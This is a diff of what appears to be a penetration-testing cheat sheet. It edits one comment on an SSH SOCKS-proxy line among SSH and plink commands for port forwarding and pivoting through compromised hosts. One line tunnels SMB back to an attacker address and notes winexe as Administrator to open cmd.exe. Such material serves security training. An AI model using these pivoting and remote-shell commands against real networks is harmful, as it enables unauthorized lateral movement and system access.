@@ -61,7 +61,7 @@
 |ssh -L 127.0.0.1:8080:127.0.0.1:80 remotehost |
 |ssh -nNT -L 8000:localhost:3306 user@pivoting host #Local Port Forwarding |
 |ssh -nNT -R 0.0.0.0:4000:192.168.1.101:631 user@pivot host |
-|ssh -D 5000 -nNT user@pivoting host #SOCKS Proxy|
+|ssh -D 5000 -nNT user@pivoting host #Port 5000 is expected configure as browser proxy such as 127.0.0.1 5000|
 |ssh -p 13339 -f -N j0hn@10.11.1.252  |
 |ssh -N -f -D 8888 -p 22000 j0hn@192.168.13.252 |
 |plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8 #winexe -U Administrator //127.0.0.1 "cmd.exe|
